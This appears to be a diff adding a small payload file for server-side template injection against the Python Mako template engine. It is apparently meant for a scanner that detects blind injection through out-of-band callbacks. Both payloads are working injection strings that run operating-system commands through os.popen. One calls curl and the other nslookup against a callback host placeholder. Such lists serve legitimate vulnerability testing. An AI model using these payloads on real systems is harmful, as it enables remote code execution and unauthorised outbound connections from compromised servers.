@@ -1,0 +1,4 @@
+# Mako SSTI payloads - Python template engine
+# {{CALLBACK}} replaced with callback URL
+<%import os;os.popen("curl {{CALLBACK}}").read()%>
+${__import__("os").popen("nslookup {{CALLBACK}}").read()}
